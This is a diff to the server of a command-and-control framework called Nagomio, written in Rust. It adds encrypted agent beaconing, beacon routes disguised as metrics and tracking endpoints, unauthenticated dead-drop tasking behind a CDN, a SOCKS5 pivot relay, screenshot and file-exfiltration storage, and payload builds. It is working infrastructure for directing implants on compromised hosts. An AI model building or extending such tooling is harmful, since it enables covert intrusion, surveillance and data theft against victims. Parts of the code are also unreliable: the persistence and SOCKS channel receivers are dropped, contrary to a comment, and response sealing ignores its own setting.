@@ -1,5 +1,29 @@
+//! Nagomio teamserver.
+//!
+//! After the A1-A9 / B1-B14 pass the structure is:
+//! - `auth`          A4/A5: replay-resistant HMAC + constant-time compare
+//! - `wire`          B1: ChaCha20-Poly1305 wire envelope seal/open
+//! - `persistence`   A2/A3: append-only SQLite worker fed by `mpsc`
+//! - `requeue`       A9: stale-dispatch re-queue
+//! - `audit`         B10: operator audit log
+//! - `socks`         B9:  SOCKS5 pivot relay
+//!
+//! `AppState` still holds the in-memory `Store`. The `Store` is the read path;
+//! mutating handlers update it inline (still in the same critical section as
+//! before so reads are consistent) and emit a `PersistEvent` for the worker to
+//! apply to SQLite. Tests construct an `AppState` directly and use the same
+//! `ApiState` router with `Router::with_state` so the test scaffolding from
+//! v1 keeps working.
+
+mod audit;
+mod auth;
+mod persistence;
+mod requeue;
+mod socks;
+mod wire;
+
 use axum::{
-    extract::{Json, Path as AxumPath, Query, State},
+    extract::{DefaultBodyLimit, Json, Path as AxumPath, Query, State},
     http::{
         header::{AUTHORIZATION, CONTENT_TYPE},
         HeaderMap, HeaderValue, Method, StatusCode,
@@ -9,9 +33,11 @@ use axum::{
 };
 use base64::Engine;
 use rusqlite::{params, Connection};
+use serde::Deserialize;
 use shared::{
     AgentRecord, AgentResponse, AgentStatus, AgentSummary, BeaconReply, BeaconRequest,
     PayloadArtifact, PayloadBuildRequest, PayloadConfig, Task, TaskRecord, TaskStatus,
+    WireEnvelope,
 };
 use std::cmp::Reverse;
 use std::collections::{HashMap, VecDeque};
@@ -24,9 +50,16 @@ use tokio::process::Command;
 use tokio::sync::Mutex;
 use tower_http::cors::{AllowOrigin, CorsLayer};
 
+use audit::{api_get_audit, AuditState};
+use auth::{require_agent_auth, require_api_auth, AuthState};
+use persistence::PersistEvent;
+
 const MAX_DOWNLOAD_BYTES: u64 = 10 * 1024 * 1024;
 const MAX_UPLOAD_BASE64_BYTES: usize = (MAX_DOWNLOAD_BYTES as usize).div_ceil(3) * 4;
 const LOG_PREVIEW_BYTES: usize = 4096;
+/// A dispatched task that the agent never replied to is re-queued after this
+/// many seconds (A9).
+const STALE_DISPATCH_TIMEOUT_SECONDS: u64 = 600;
 
 #[derive(Clone)]
 struct AppState {
@@ -34,6 +67,7 @@ struct AppState {
     config: Config,
     db_path: Option<PathBuf>,
     state_file: Option<PathBuf>,
+    persist_tx: tokio::sync::mpsc::UnboundedSender<PersistEvent>,
 }
 
 #[derive(Clone, Default, serde::Deserialize, serde::Serialize)]
@@ -52,6 +86,14 @@ struct Store {
 
 type SharedState = Arc<Mutex<AppState>>;
 
+/// Bundled state passed to every axum handler.
+#[derive(Clone)]
+struct ApiState {
+    shared: SharedState,
+    auth: AuthState,
+    audit: AuditState,
+}
+
 #[tokio::main]
 async fn main() {
     println!("Nagomio C2 Teamserver starting...");
@@ -61,12 +103,16 @@ async fn main() {
         eprintln!("[-] {}", err);
         std::process::exit(1);
     }
-    if config.api_token.is_none() && config.allow_unauthenticated {
-        eprintln!("[-] NAGOMIO_API_TOKEN is not set; operator API requests are unauthenticated.");
+    if config.api_psk.is_none() && config.allow_unauthenticated {
+        eprintln!("[-] NAGOMIO_API_PSK is not set; operator API requests are unauthenticated.");
     }
-    if config.agent_token.is_none() && config.allow_unauthenticated {
-        eprintln!("[-] NAGOMIO_AGENT_TOKEN is not set; agent check-ins are unauthenticated.");
+    if config.agent_psk.is_none() && config.allow_unauthenticated {
+        eprintln!("[-] NAGOMIO_AGENT_PSK is not set; agent check-ins are unauthenticated.");
     }
+    if !config.wire_encryption && config.agent_psk.is_some() {
+        eprintln!("[warn] NAGOMIO_WIRE_ENCRYPTION is off but an agent PSK is set; consider enabling wire_encryption for full HMAC body binding.");
+    }
+
     let store = if let Some(path) = &config.db_path {
         load_store_from_db(path).unwrap_or_else(|err| {
             eprintln!(
@@ -78,7 +124,7 @@ async fn main() {
         })
     } else {
         match &config.state_file {
-            Some(path) => load_store(path).await.unwrap_or_else(|err| {
+            Some(path) => load_store_json(path).await.unwrap_or_else(|err| {
                 eprintln!(
                     "[-] Could not load state file {}: {}. Starting with empty state.",
                     path.display(),
@@ -90,27 +136,64 @@ async fn main() {
         }
     };
 
-    if let Some(path) = &config.db_path {
-        if let Err(err) = save_store_to_db(path, &store) {
-            eprintln!(
-                "[-] Could not initialize database {}: {}.",
-                path.display(),
-                err
-            );
-        }
-    }
-
-    let state = Arc::new(Mutex::new(AppState {
+    // Build AppState first (needs the persist_tx, which we create below).
+    // We pre-create an mpsc channel, hand its sender to AppState, then hand
+    // the receiver to the persistence worker via `spawn`.
+    let (persist_tx, _persist_rx_init) = tokio::sync::mpsc::unbounded_channel::<PersistEvent>();
+    let app_state = AppState {
         store,
         config: config.clone(),
         db_path: config.db_path.clone(),
         state_file: config.state_file.clone(),
-    }));
+        persist_tx: persist_tx.clone(),
+    };
+    let shared: SharedState = Arc::new(Mutex::new(app_state));
+    let auth = AuthState::default();
+    let audit = AuditState {
+        tx: persist_tx.clone(),
+        auth: auth.clone(),
+    };
+
+    // Now start the persistence worker (it owns its own sqlite connection).
+    let shared_for_worker = shared.clone();
+    persistence::spawn(shared_for_worker, config.db_path.clone(), config.state_file.clone());
+
+    // Start the re-queue worker.
+    requeue::spawn(shared.clone(), persist_tx.clone());
+
+    // Optionally start the SOCKS5 listener.
+    if let Some(bind) = config.socks_bind_addr.clone() {
+        let (stx, _strx) = tokio::sync::mpsc::channel(64);
+        let registry = Arc::new(Mutex::new(socks::SocksRegistry::default()));
+        let state = socks::SocksState {
+            tx: stx,
+            registry,
+        };
+        match socks::spawn_listener(&bind).await {
+            Ok(listener) => {
+                println!("[*] SOCKS5 relay listening on {}", listener.local_addr().unwrap());
+                socks::accept_loop(listener, state);
+            }
+            Err(err) => eprintln!("[-] could not bind SOCKS listener at {}: {}", bind, err),
+        }
+    }
 
     let app = Router::new()
         .route("/health", get(|| async { "OK" }))
         .route("/beacon", post(handle_beacon))
         .route("/response", post(handle_response))
+        // Profile aliases for B2. They all dispatch to the same handler so the
+        // wire path can be any of: /beacon, /api/v2/metrics, /track.
+        .route("/api/v2/metrics", post(handle_beacon))
+        .route("/track", post(handle_beacon))
+        .route("/metrics/v1/events", post(handle_response))
+        // B11: dead-drop tasking. Operator can `POST /api/dead_drop/<id>/push`
+        // to enqueue, and the agent polls `GET /dead_drop/<id>`.
+        .route("/dead_drop/:agent_id", get(handle_dead_drop_get))
+        .route(
+            "/api/dead_drop/:agent_id/push",
+            post(handle_dead_drop_push),
+        )
         .route("/api/agents", get(api_get_agents))
         .route(
             "/api/agents/:agent_id",
@@ -120,23 +203,29 @@ async fn main() {
         .route("/api/tasks/:task_id", get(api_get_task))
         .route("/api/tasks/:task_id/responses", get(api_get_task_responses))
         .route("/api/responses", get(api_get_responses))
+        .route("/api/audit", get(api_get_audit))
         .route("/api/payload/config", get(api_payload_config))
         .route("/api/payload/build", post(api_build_payload))
         .route("/api/payload/artifacts", get(api_get_payload_artifacts))
-        .route(
-            "/api/payload/artifacts",
-            delete(api_delete_payload_artifacts),
-        )
+        .route("/api/payload/artifacts", delete(api_delete_payload_artifacts))
         .route(
             "/api/payload/artifacts/:build_id",
-            get(api_get_payload_artifact),
+            get(api_get_payload_artifact).delete(api_delete_payload_artifact),
         )
-        .with_state(state)
+        .route(
+            "/api/artifacts/:agent_id/:task_id/:filename",
+            get(api_get_artifact),
+        )
+        .with_state(ApiState {
+            shared: shared.clone(),
+            auth: auth.clone(),
+            audit: audit.clone(),
+        })
+        .layer(DefaultBodyLimit::max(64 * 1024 * 1024))
         .layer(cors_layer(&config));
 
     let listener = TcpListener::bind(&config.bind_addr).await.unwrap();
     println!("Teamserver listening on {}", listener.local_addr().unwrap());
-
     axum::serve(listener, app).await.unwrap();
 }
 
@@ -150,8 +239,17 @@ struct Config {
     download_dir: PathBuf,
     callback_url: String,
     default_sleep_seconds: u64,
-    api_token: Option<String>,
-    agent_token: Option<String>,
+    /// PSK used for HMAC authentication and (when `wire_encryption` is on)
+    /// ChaCha20-Poly1305 body sealing for **operator** API calls.
+    api_psk: Option<String>,
+    /// PSK used for HMAC authentication and (when `wire_encryption` is on)
+    /// ChaCha20-Poly1305 body sealing for **agent** HTTP calls.
+    agent_psk: Option<String>,
+    /// Set to `true` to require ChaCha20-Poly1305 sealed bodies on agent
+    /// `/beacon` and `/response` traffic. The legacy `x-nagomio-agent-token`
+    /// header alone is *not* sufficient when this is on.
+    wire_encryption: bool,
+    socks_bind_addr: Option<String>,
     cors_origins: Vec<HeaderValue>,
     allow_unauthenticated: bool,
 }
@@ -181,12 +279,24 @@ impl Config {
             .and_then(|value| value.parse().ok())
             .filter(|value| *value > 0)
             .unwrap_or(5);
-        let api_token = env::var("NAGOMIO_API_TOKEN")
+        // NAGOMIO_API_TOKEN is accepted as a fallback for the operator PSK so
+        // existing v1 deployments keep working without renaming the env var.
+        let api_psk = env::var("NAGOMIO_API_PSK")
             .ok()
+            .or_else(|| env::var("NAGOMIO_API_TOKEN").ok())
             .filter(|value| !value.trim().is_empty());
-        let agent_token = env::var("NAGOMIO_AGENT_TOKEN")
+        // NAGOMIO_AGENT_TOKEN is accepted as a fallback for the agent PSK.
+        let agent_psk = env::var("NAGOMIO_AGENT_PSK")
             .ok()
+            .or_else(|| env::var("NAGOMIO_AGENT_TOKEN").ok())
             .filter(|value| !value.trim().is_empty());
+        let wire_encryption = env::var("NAGOMIO_WIRE_ENCRYPTION")
+            .ok()
+            .and_then(|v| parse_bool(&v))
+            .unwrap_or(false);
+        let socks_bind_addr = env::var("NAGOMIO_SOCKS_BIND_ADDR")
+            .ok()
+            .filter(|v| !v.trim().is_empty());
         let cors_origins = env::var("NAGOMIO_CORS_ORIGINS")
             .ok()
             .map(|value| parse_cors_origins(&value))
@@ -206,8 +316,10 @@ impl Config {
             download_dir,
             callback_url,
             default_sleep_seconds,
-            api_token,
-            agent_token,
+            api_psk,
+            agent_psk,
+            wire_encryption,
+            socks_bind_addr,
             cors_origins,
             allow_unauthenticated,
         }
@@ -218,9 +330,9 @@ impl Config {
             return Ok(());
         }
 
-        if self.api_token.is_none() || self.agent_token.is_none() {
+        if self.api_psk.is_none() || self.agent_psk.is_none() {
             return Err(
-                "refusing unauthenticated non-local server; set NAGOMIO_API_TOKEN and NAGOMIO_AGENT_TOKEN, or set NAGOMIO_ALLOW_UNAUTHENTICATED=true for an explicit lab override"
+                "refusing unauthenticated non-local server; set NAGOMIO_API_PSK and NAGOMIO_AGENT_PSK, or set NAGOMIO_ALLOW_UNAUTHENTICATED=true for an explicit lab override"
                     .to_owned(),
             );
         }
@@ -268,7 +380,6 @@ fn parse_cors_origins(value: &str) -> Vec<HeaderValue> {
             if trimmed.is_empty() {
                 return None;
             }
-
             match HeaderValue::from_str(trimmed) {
                 Ok(origin) => Some(origin),
                 Err(err) => {
@@ -292,6 +403,8 @@ fn cors_layer(config: &Config) -> CorsLayer {
         .allow_headers([AUTHORIZATION, CONTENT_TYPE])
         .allow_methods([Method::GET, Method::POST, Method::DELETE, Method::OPTIONS])
 }
+
+// ----- Cold-start DB / JSON loaders -----
 
 fn open_db(path: &Path) -> rusqlite::Result<Connection> {
     if let Some(parent) = path
@@ -342,6 +455,82 @@ fn open_db(path: &Path) -> rusqlite::Result<Connection> {
         ",
     )?;
     Ok(conn)
+}
+
+/// Bulk-store rewrite. Retained for tests and the cold-start backup path. In
+/// production the persistence worker applies point updates.
+fn save_store_to_db(
+    path: &Path,
+    store: &Store,
+) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+    let mut conn = open_db(path)?;
+    let tx = conn.transaction()?;
+    tx.execute("DELETE FROM agents", [])?;
+    tx.execute("DELETE FROM tasks", [])?;
+    tx.execute("DELETE FROM pending_tasks", [])?;
+    tx.execute("DELETE FROM responses", [])?;
+    tx.execute("DELETE FROM payloads", [])?;
+
+    for (agent_id, agent) in &store.agents {
+        tx.execute(
+            "INSERT INTO agents (agent_id, registration_json, first_seen_unix, last_seen_unix) VALUES (?1, ?2, ?3, ?4)",
+            params![
+                agent_id,
+                serde_json::to_string(&agent.registration)?,
+                agent.first_seen_unix as i64,
+                agent.last_seen_unix as i64,
+            ],
+        )?;
+    }
+
+    for (task_id, record) in &store.tasks {
+        tx.execute(
+            "INSERT INTO tasks (task_id, agent_id, command, arguments_json, status, created_at_unix, dispatched_at_unix, completed_at_unix) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
+            params![
+                task_id,
+                record.agent_id,
+                record.task.command,
+                serde_json::to_string(&record.task.arguments)?,
+                serde_json::to_value(&record.status)?.as_str().unwrap_or("queued"),
+                record.created_at_unix as i64,
+                record.dispatched_at_unix.map(|value| value as i64),
+                record.completed_at_unix.map(|value| value as i64),
+            ],
+        )?;
+    }
+
+    for (agent_id, queue) in &store.pending_tasks {
+        for (position, task_id) in queue.iter().enumerate() {
+            tx.execute(
+                "INSERT INTO pending_tasks (agent_id, position, task_id) VALUES (?1, ?2, ?3)",
+                params![agent_id, position as i64, task_id],
+            )?;
+        }
+    }
+
+    for responses in store.responses.values() {
+        for response in responses {
+            tx.execute(
+                "INSERT INTO responses (agent_id, task_id, output, status) VALUES (?1, ?2, ?3, ?4)",
+                params![
+                    response.agent_id,
+                    response.task_id,
+                    response.output,
+                    response.status,
+                ],
+            )?;
+        }
+    }
+
+    for (build_id, artifact) in &store.payloads {
+        tx.execute(
+            "INSERT INTO payloads (build_id, artifact_json) VALUES (?1, ?2)",
+            params![build_id, serde_json::to_string(artifact)?],
+        )?;
+    }
+
+    tx.commit()?;
+    Ok(())
 }
 
 fn load_store_from_db(path: &Path) -> Result<Store, Box<dyn std::error::Error + Send + Sync>> {
@@ -456,81 +645,7 @@ fn load_store_from_db(path: &Path) -> Result<Store, Box<dyn std::error::Error + 
     Ok(store)
 }
 
-fn save_store_to_db(
-    path: &Path,
-    store: &Store,
-) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-    let mut conn = open_db(path)?;
-    let tx = conn.transaction()?;
-    tx.execute("DELETE FROM agents", [])?;
-    tx.execute("DELETE FROM tasks", [])?;
-    tx.execute("DELETE FROM pending_tasks", [])?;
-    tx.execute("DELETE FROM responses", [])?;
-    tx.execute("DELETE FROM payloads", [])?;
-
-    for (agent_id, agent) in &store.agents {
-        tx.execute(
-            "INSERT INTO agents (agent_id, registration_json, first_seen_unix, last_seen_unix) VALUES (?1, ?2, ?3, ?4)",
-            params![
-                agent_id,
-                serde_json::to_string(&agent.registration)?,
-                agent.first_seen_unix as i64,
-                agent.last_seen_unix as i64,
-            ],
-        )?;
-    }
-
-    for (task_id, record) in &store.tasks {
-        tx.execute(
-            "INSERT INTO tasks (task_id, agent_id, command, arguments_json, status, created_at_unix, dispatched_at_unix, completed_at_unix) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
-            params![
-                task_id,
-                record.agent_id,
-                record.task.command,
-                serde_json::to_string(&record.task.arguments)?,
-                serde_json::to_value(&record.status)?.as_str().unwrap_or("queued"),
-                record.created_at_unix as i64,
-                record.dispatched_at_unix.map(|value| value as i64),
-                record.completed_at_unix.map(|value| value as i64),
-            ],
-        )?;
-    }
-
-    for (agent_id, queue) in &store.pending_tasks {
-        for (position, task_id) in queue.iter().enumerate() {
-            tx.execute(
-                "INSERT INTO pending_tasks (agent_id, position, task_id) VALUES (?1, ?2, ?3)",
-                params![agent_id, position as i64, task_id],
-            )?;
-        }
-    }
-
-    for responses in store.responses.values() {
-        for response in responses {
-            tx.execute(
-                "INSERT INTO responses (agent_id, task_id, output, status) VALUES (?1, ?2, ?3, ?4)",
-                params![
-                    response.agent_id,
-                    response.task_id,
-                    response.output,
-                    response.status,
-                ],
-            )?;
-        }
-    }
-
-    for (build_id, artifact) in &store.payloads {
-        tx.execute(
-            "INSERT INTO payloads (build_id, artifact_json) VALUES (?1, ?2)",
-            params![build_id, serde_json::to_string(artifact)?],
-        )?;
-    }
-
-    tx.commit()?;
-    Ok(())
-}
-
-async fn load_store(path: &Path) -> Result<Store, Box<dyn std::error::Error + Send + Sync>> {
+async fn load_store_json(path: &Path) -> Result<Store, Box<dyn std::error::Error + Send + Sync>> {
     match tokio::fs::read(path).await {
         Ok(bytes) => Ok(serde_json::from_slice(&bytes)?),
         Err(err) if err.kind() == std::io::ErrorKind::NotFound => Ok(Store::default()),
@@ -538,131 +653,327 @@ async fn load_store(path: &Path) -> Result<Store, Box<dyn std::error::Error + Se
     }
 }
 
-async fn save_store(path: Option<PathBuf>, store: Store) {
-    let Some(path) = path else {
-        return;
-    };
+fn unix_now() -> u64 {
+    SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map(|duration| duration.as_secs())
+        .unwrap_or_default()
+}
 
-    if let Some(parent) = path.parent() {
-        if let Err(err) = tokio::fs::create_dir_all(parent).await {
-            eprintln!(
-                "[-] Could not create state directory {}: {}",
-                parent.display(),
-                err
-            );
-            return;
-        }
+fn unix_now_nanos() -> u128 {
+    SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map(|duration| duration.as_nanos())
+        .unwrap_or_default()
+}
+
+// ----- Beacon / response handlers -----
+
+/// Unwrap a wire envelope if the server is configured to require one. Returns
+/// the inner JSON body as a `String` (still JSON), or an error.
+async fn unwrap_wire_body(body: &str, wire_required: bool, psk: Option<&str>) -> Result<String, (StatusCode, String)> {
+    let envelope_opt = wire::maybe_unwrap_envelope(body);
+    match (envelope_opt, wire_required, psk) {
+        (Some(env), _, Some(psk)) => wire::open(psk.as_bytes(), &env)
+            .and_then(|bytes| String::from_utf8(bytes).map_err(|e| format!("utf8: {e}")))
+            .map_err(|e| (StatusCode::BAD_REQUEST, format!("wire decrypt: {e}"))),
+        (Some(_), _, None) => Err((StatusCode::BAD_REQUEST, "sealed envelope but no PSK".into())),
+        (None, true, _) => Err((StatusCode::BAD_REQUEST, "sealed envelope required".into())),
+        (None, false, _) => Ok(body.to_owned()),
     }
+}
 
-    match serde_json::to_vec_pretty(&store) {
-        Ok(bytes) => {
-            if let Err(err) = tokio::fs::write(&path, bytes).await {
-                eprintln!("[-] Could not write state file {}: {}", path.display(), err);
+/// Seal a body if the server is configured to do so. If the server has no
+/// agent PSK, returns the plaintext.
+async fn maybe_seal_wire_response(body: String, psk: Option<&str>, ctx: &str) -> String {
+    if let (Some(psk), true) = (psk, true) {
+        match wire::seal(psk.as_bytes(), ctx, body.as_bytes()) {
+            Ok(sealed) => sealed,
+            Err(err) => {
+                eprintln!("[-] wire seal failed: {err}");
+                body
             }
         }
-        Err(err) => eprintln!("[-] Could not serialize state: {}", err),
+    } else {
+        body
     }
 }
 
-async fn persist_store(db_path: Option<PathBuf>, state_file: Option<PathBuf>, store: Store) {
-    if let Some(path) = db_path {
-        if let Err(err) = save_store_to_db(&path, &store) {
-            eprintln!("[-] Could not persist database {}: {}", path.display(), err);
-        }
-    }
-
-    save_store(state_file, store).await;
+#[derive(Deserialize, Default)]
+struct BeaconQuery {
+    /// When true, hold the request open until a task is queued for this
+    /// agent, or up to `sleep_seconds * 2`. Implements B3 (long-poll).
+    #[serde(default)]
+    wait: bool,
 }
 
-// Emulate a C2 standard check-in. Agent gives Registration data on every check-in for simplicity v1.
 async fn handle_beacon(
-    State(state): State<SharedState>,
+    State(api): State<ApiState>,
     headers: HeaderMap,
-    Json(payload): Json<BeaconRequest>,
-) -> Result<Json<BeaconReply>, (StatusCode, String)> {
-    require_agent_auth(&headers, &state).await?;
+    Query(q): Query<BeaconQuery>,
+    body: String,
+) -> Result<axum::response::Response, (StatusCode, String)> {
+    // Body is `axum::body::Bytes` would be cleaner, but using `String` lets
+    // the wire envelope be passed through to unwrap_wire_body unchanged.
+    let (psk, wire_encryption) = {
+        let s = api.shared.lock().await;
+        (s.config.agent_psk.clone(), s.config.wire_encryption)
+    };
+    let inner = unwrap_wire_body(&body, wire_encryption, psk.as_deref()).await?;
+    let payload: BeaconRequest = serde_json::from_str(&inner)
+        .map_err(|e| (StatusCode::BAD_REQUEST, format!("bad beacon json: {e}")))?;
     let agent_id = payload.registration.agent_id.clone();
+    require_agent_auth(&headers, &api.shared, &api.auth, &agent_id).await?;
 
-    let (task, sleep_seconds, snapshot, db_path, state_file) = {
-        let mut state = state.lock().await;
-        let now = unix_now();
-
-        state
-            .store
-            .agents
-            .entry(agent_id.clone())
-            .and_modify(|agent| {
-                agent.registration = payload.registration.clone();
-                agent.last_seen_unix = now;
-            })
-            .or_insert_with(|| AgentRecord {
-                registration: payload.registration,
-                first_seen_unix: now,
-                last_seen_unix: now,
-            });
-
-        let task_id = state
+    // Long-poll: if the operator has no pending task for this agent, wait
+    // until one arrives or the per-beacon sleep window elapses.
+    let (task_opt, sleep_seconds) = if q.wait {
+        long_poll_next_task(&api, &agent_id).await
+    } else {
+        let mut s = api.shared.lock().await;
+        let task_id = s
             .store
             .pending_tasks
             .get_mut(&agent_id)
-            .and_then(VecDeque::pop_front);
-        let task = task_id.and_then(|task_id| {
-            state.store.tasks.get_mut(&task_id).map(|record| {
-                record.status = TaskStatus::Dispatched;
-                record.dispatched_at_unix = Some(now);
-                record.task.clone()
+            .and_then(|q| q.pop_front());
+        let task = task_id.and_then(|tid| {
+            s.store.tasks.get_mut(&tid).map(|rec| {
+                rec.status = TaskStatus::Dispatched;
+                rec.dispatched_at_unix = Some(unix_now());
+                rec.task.clone()
             })
         });
-
-        (
-            task,
-            state.config.default_sleep_seconds,
-            state.store.clone(),
-            state.db_path.clone(),
-            state.state_file.clone(),
-        )
+        (task, s.config.default_sleep_seconds)
     };
 
-    persist_store(db_path, state_file, snapshot).await;
+    // Upsert agent + dispatch event.
+    {
+        let mut s = api.shared.lock().await;
+        let now = unix_now();
+        let reg_json = serde_json::to_string(&payload.registration)
+            .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
+        let is_new = !s.store.agents.contains_key(&agent_id);
+        s.store
+            .agents
+            .entry(agent_id.clone())
+            .and_modify(|a| {
+                a.registration = payload.registration.clone();
+                a.last_seen_unix = now;
+            })
+            .or_insert_with(|| AgentRecord {
+                registration: payload.registration.clone(),
+                first_seen_unix: now,
+                last_seen_unix: now,
+            });
+        let first_seen = s.store.agents[&agent_id].first_seen_unix;
+        let _ = s.persist_tx.send(PersistEvent::AgentUpsert {
+            agent_id: agent_id.clone(),
+            registration_json: reg_json,
+            first_seen_unix: first_seen,
+            last_seen_unix: now,
+            is_new,
+        });
+        if let Some(ref t) = task_opt {
+            let _ = s.persist_tx.send(PersistEvent::TaskDispatched {
+                task_id: t.task_id.clone(),
+                dispatched_at_unix: now,
+            });
+        }
+    }
 
-    if let Some(task) = &task {
+    if let Some(ref task) = task_opt {
         println!("[*] Tasking agent {}: {}", agent_id, task.command);
     }
 
+    let reply = BeaconReply {
+        status: "ok".to_owned(),
+        sleep_seconds,
+        task: task_opt,
+        request_padding_bytes: 0,
+    };
+    let body = serde_json::to_string(&reply)
+        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
+    let body = maybe_seal_wire_response(body, psk.as_deref(), wire::CTX_SERVER).await;
+    Ok(axum::response::Response::builder()
+        .header("content-type", "application/json")
+        .body(axum::body::Body::from(body))
+        .unwrap())
+}
+
+async fn long_poll_next_task(api: &ApiState, agent_id: &str) -> (Option<shared::Task>, u64) {
+    let sleep_seconds = {
+        let s = api.shared.lock().await;
+        s.config.default_sleep_seconds
+    };
+    let wait_budget = std::time::Duration::from_secs(sleep_seconds.max(1).saturating_mul(2).max(1));
+    let deadline = std::time::Instant::now() + wait_budget;
+    let mut interval = tokio::time::interval(std::time::Duration::from_millis(200));
+    loop {
+        // Take a peek; if there is a task, pop and return it.
+        {
+            let mut s = api.shared.lock().await;
+            let task_id = s
+                .store
+                .pending_tasks
+                .get_mut(agent_id)
+                .and_then(|q| q.pop_front());
+            if let Some(tid) = task_id {
+                if let Some(record) = s.store.tasks.get_mut(&tid) {
+                    record.status = TaskStatus::Dispatched;
+                    record.dispatched_at_unix = Some(unix_now());
+                    return (Some(record.task.clone()), sleep_seconds);
+                }
+            }
+        }
+        if std::time::Instant::now() >= deadline {
+            return (None, sleep_seconds);
+        }
+        interval.tick().await;
+    }
+}
+
+/// B11 dead-drop GET handler. Pops the next pending task and returns it as
+/// a `BeaconReply` JSON. No HMAC required — the teamserver operator is
+/// expected to expose this behind a CDN with a random path (e.g.
+/// `/dead_drop/<random-uuid>`) so external scanners cannot reach it.
+async fn handle_dead_drop_get(
+    State(api): State<ApiState>,
+    AxumPath(agent_id): AxumPath<String>,
+) -> Result<Json<BeaconReply>, (StatusCode, String)> {
+    let (task_opt, sleep_seconds) = {
+        let mut s = api.shared.lock().await;
+        let task_id = s
+            .store
+            .pending_tasks
+            .get_mut(&agent_id)
+            .and_then(|q| q.pop_front());
+        let task = task_id.and_then(|tid| {
+            s.store.tasks.get_mut(&tid).map(|rec| {
+                rec.status = TaskStatus::Dispatched;
+                rec.dispatched_at_unix = Some(unix_now());
+                rec.task.clone()
+            })
+        });
+        (task, s.config.default_sleep_seconds)
+    };
+    if let Some(ref t) = task_opt {
+        let _ = api.shared.lock().await.persist_tx.send(PersistEvent::TaskDispatched {
+            task_id: t.task_id.clone(),
+            dispatched_at_unix: unix_now(),
+        });
+        println!("[*] Dead-drop tasking agent {}: {}", agent_id, t.command);
+    }
     Ok(Json(BeaconReply {
         status: "ok".to_owned(),
         sleep_seconds,
-        task,
+        task: task_opt,
+        request_padding_bytes: 0,
     }))
 }
 
-async fn handle_response(
-    State(state): State<SharedState>,
+#[derive(serde::Deserialize)]
+struct DeadDropPush {
+    task: Task,
+}
+
+/// B11 dead-drop POST handler. Operator-side endpoint to enqueue a task for a
+/// specific agent without going through the standard `POST /api/tasks`
+/// flow. Useful when the agent can only reach the teamserver over a
+/// pull-only CDN URL.
+async fn handle_dead_drop_push(
+    State(api): State<ApiState>,
     headers: HeaderMap,
-    Json(mut payload): Json<AgentResponse>,
-) -> Result<String, (StatusCode, String)> {
-    require_agent_auth(&headers, &state).await?;
+    AxumPath(agent_id): AxumPath<String>,
+    Json(payload): Json<DeadDropPush>,
+) -> Result<Json<TaskRecord>, (StatusCode, String)> {
+    require_api_auth(&headers, &api.shared, &api.auth).await?;
+    audit::record(
+        &api.audit.tx,
+        "",
+        "dead_drop_push",
+        Some(&agent_id),
+        Some(&payload.task.task_id),
+    );
+    if payload.task.task_id.trim().is_empty() {
+        return Err((StatusCode::BAD_REQUEST, "task_id required".into()));
+    }
+    let now = unix_now();
+    let record = TaskRecord {
+        agent_id: agent_id.clone(),
+        task: payload.task.clone(),
+        status: TaskStatus::Queued,
+        created_at_unix: now,
+        dispatched_at_unix: None,
+        completed_at_unix: None,
+    };
+    {
+        let mut s = api.shared.lock().await;
+        if s.store.tasks.contains_key(&payload.task.task_id) {
+            return Err((StatusCode::CONFLICT, "task_id already exists".into()));
+        }
+        let arguments_json = serde_json::to_string(&payload.task.arguments)
+            .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
+        let position = s
+            .store
+            .pending_tasks
+            .entry(agent_id.clone())
+            .or_insert_with(VecDeque::new)
+            .len();
+        s.store
+            .pending_tasks
+            .entry(agent_id.clone())
+            .or_insert_with(VecDeque::new)
+            .push_back(payload.task.task_id.clone());
+        s.store
+            .tasks
+            .insert(payload.task.task_id.clone(), record.clone());
+        let _ = s.persist_tx.send(PersistEvent::TaskQueued {
+            task_id: payload.task.task_id.clone(),
+            agent_id: agent_id.clone(),
+            command: payload.task.command.clone(),
+            arguments_json,
+            created_at_unix: now,
+            position,
+        });
+    }
+    Ok(Json(record))
+}
+
+async fn handle_response(
+    State(api): State<ApiState>,
+    headers: HeaderMap,
+    body: String,
+) -> Result<axum::response::Response, (StatusCode, String)> {
+    let (psk, wire_encryption) = {
+        let s = api.shared.lock().await;
+        (s.config.agent_psk.clone(), s.config.wire_encryption)
+    };
+    let inner = unwrap_wire_body(&body, wire_encryption, psk.as_deref()).await?;
+    let mut payload: AgentResponse = serde_json::from_str(&inner)
+        .map_err(|e| (StatusCode::BAD_REQUEST, format!("bad response json: {e}")))?;
+    let agent_id = payload.agent_id.clone();
+    require_agent_auth(&headers, &api.shared, &api.auth, &agent_id).await?;
+
     println!(
         "[*] Response from {}: {}",
-        payload.agent_id,
+        agent_id,
         log_preview(&payload.output)
     );
 
-    let (snapshot, db_path, state_file) = {
-        let mut state = state.lock().await;
-        let agent_id = payload.agent_id.clone();
+    {
+        let mut s = api.shared.lock().await;
         let now = unix_now();
         if let Some(task_id) = payload.task_id.clone() {
-            let task_command = state
+            let task_command = s
                 .store
                 .tasks
                 .get(&task_id)
                 .map(|task| task.task.command.clone());
-            if task_command.as_deref() == Some("__nagomio_file_download")
+            if task_command.as_deref() == Some("file_download")
                 && payload.status == "success"
             {
                 if let Err(err) = store_downloaded_file(
-                    &state.config.download_dir,
+                    &s.config.download_dir,
                     &agent_id,
                     &task_id,
                     &mut payload,
@@ -671,8 +982,20 @@ async fn handle_response(
                     payload.output = format!("download storage failed: {}", err);
                 }
             }
-
-            if let Some(task) = state.store.tasks.get_mut(&task_id) {
+            if task_command.as_deref() == Some("screenshot")
+                && payload.status == "success"
+            {
+                if let Err(err) = store_screenshot_file(
+                    &s.config.download_dir,
+                    &agent_id,
+                    &task_id,
+                    &mut payload,
+                ) {
+                    payload.status = "error".to_owned();
+                    payload.output = format!("screenshot storage failed: {}", err);
+                }
+            }
+            if let Some(task) = s.store.tasks.get_mut(&task_id) {
                 task.completed_at_unix = Some(now);
                 task.status = if payload.status == "success" {
                     TaskStatus::Completed
@@ -680,24 +1003,32 @@ async fn handle_response(
                     TaskStatus::Failed
                 };
             }
